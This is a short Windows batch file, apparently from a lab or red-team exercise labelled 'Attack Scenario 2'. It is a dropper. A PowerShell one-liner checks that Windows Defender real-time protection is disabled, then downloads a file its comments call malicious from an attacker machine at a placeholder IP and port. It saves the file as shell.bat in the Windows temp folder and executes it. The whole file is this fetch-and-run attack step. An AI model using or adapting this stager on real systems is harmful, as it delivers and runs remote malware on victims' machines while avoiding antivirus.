:: This .BAT file is part of Attack Scenario 2
:: It verifies that Windows Defender's RealTimeProtection is disabled before downloading a malicious BAT file hosted by our attacker machine then executing it
:: Use ECHO off to prevent commands from being printed to the console
:: pause keeps the PowerShell window open while the previous command runs
@ECHO off
powershell -Command "& {if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {Invoke-WebRequest -URI http://[ip]:[port]/attack2_Shell.txt -OutFile c:\Windows\temp\shell.bat; c:\Windows\temp\shell.bat}}"
pause
